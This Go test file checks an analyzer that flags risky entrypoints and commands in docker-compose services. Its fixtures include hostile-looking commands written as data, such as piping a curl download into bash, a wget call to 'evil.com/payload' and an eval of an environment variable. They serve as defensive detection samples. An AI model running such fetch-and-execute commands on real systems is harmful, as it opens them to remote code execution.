package entrypoint

import (
	"strings"
	"testing"

	"github.com/joeyvictorino/tasia/internal/collect"
	"github.com/joeyvictorino/tasia/internal/collect/compose"
)

func collected(services []compose.Service) *collect.Collected {
	return &collect.Collected{
		ComposeFiles: []compose.File{{Path: "docker-compose.yml", Services: services}},
	}
}

func TestEmptyServices(t *testing.T) {
	r := Analyze(collected(nil))
	if r.Summary.TotalServices != 0 {
		t.Fatalf("expected 0, got %d", r.Summary.TotalServices)
	}
}

func TestNoEntrypoint(t *testing.T) {
	svcs := []compose.Service{{Name: "web"}}
	r := Analyze(collected(svcs))
	if r.Summary.WithEntrypoint != 0 {
		t.Fatalf("expected 0 with entrypoint, got %d", r.Summary.WithEntrypoint)
	}
	if r.Summary.TotalFindings != 0 {
		t.Fatalf("expected 0 findings, got %d", r.Summary.TotalFindings)
	}
}

func TestExecFormNoFinding(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Entrypoint: []string{"/app/server", "--port", "8080"}},
	}
	r := Analyze(collected(svcs))
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_shell_form" {
				t.Fatal("exec form should not trigger shell form finding")
			}
		}
	}
}

func TestShellFormEntrypoint(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Entrypoint: []string{"/bin/sh -c 'echo hello'"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_shell_form" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected entrypoint_shell_form finding")
	}
}

func TestShellFormCommand(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Command: []string{"python manage.py runserver 0.0.0.0:8000"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "command_shell_form" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected command_shell_form finding")
	}
}

func TestDangerousCurl(t *testing.T) {
	svcs := []compose.Service{
		{Name: "setup", Entrypoint: []string{"sh", "-c", "curl http://example.com/setup.sh | bash"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_dangerous_cmd" && strings.Contains(f.Detail, "curl") {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected dangerous command finding for curl")
	}
}

func TestDangerousWget(t *testing.T) {
	svcs := []compose.Service{
		{Name: "init", Command: []string{"wget", "http://evil.com/payload"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_dangerous_cmd" && strings.Contains(f.Detail, "wget") {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected dangerous command finding for wget")
	}
}

func TestDangerousEval(t *testing.T) {
	svcs := []compose.Service{
		{Name: "agent", Entrypoint: []string{"sh", "-c", "eval $STARTUP_CMD"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_dangerous_cmd" && strings.Contains(f.Detail, "eval") {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected dangerous command finding for eval")
	}
}

func TestSensitiveEnvRef(t *testing.T) {
	svcs := []compose.Service{
		{Name: "agent", Command: []string{"sh", "-c", "myapp --token=$SECRET_TOKEN"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_secret_ref" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected entrypoint_secret_ref finding")
	}
}

func TestNoSensitiveEnvRef(t *testing.T) {
	svcs := []compose.Service{
		{Name: "agent", Command: []string{"myapp", "--port", "8080"}},
	}
	r := Analyze(collected(svcs))
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_secret_ref" {
				t.Fatal("should not flag non-sensitive env refs")
			}
		}
	}
}

func TestSudo(t *testing.T) {
	svcs := []compose.Service{
		{Name: "agent", Entrypoint: []string{"sudo", "python", "agent.py"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_sudo" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected entrypoint_sudo finding")
	}
}

func TestSleepPoll(t *testing.T) {
	svcs := []compose.Service{
		{Name: "poller", Entrypoint: []string{"sh", "-c", "while true; do sleep 5; check_status; done"}},
	}
	r := Analyze(collected(svcs))
	found := false
	for _, sr := range r.Services {
		for _, f := range sr.Findings {
			if f.RuleID == "entrypoint_sleep_poll" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("expected entrypoint_sleep_poll finding")
	}
}

func TestSafeEntrypoint(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Entrypoint: []string{"/app/server"}, Command: []string{"--port", "8080"}},
	}
	r := Analyze(collected(svcs))
	if r.Summary.TotalFindings != 0 {
		t.Fatalf("expected 0 findings for safe entrypoint, got %d", r.Summary.TotalFindings)
	}
}

func TestFormatText(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Entrypoint: []string{"curl http://example.com | bash"}},
	}
	r := Analyze(collected(svcs))
	text := FormatText(r)
	if !strings.Contains(text, "Entrypoint") {
		t.Fatal("expected header in text output")
	}
	if !strings.Contains(text, "web") {
		t.Fatal("expected service name in output")
	}
}

func TestWithCommandCount(t *testing.T) {
	svcs := []compose.Service{
		{Name: "web", Command: []string{"/app/run"}},
		{Name: "db"},
	}
	r := Analyze(collected(svcs))
	if r.Summary.WithCommand != 1 {
		t.Fatalf("expected 1 with command, got %d", r.Summary.WithCommand)
	}
}
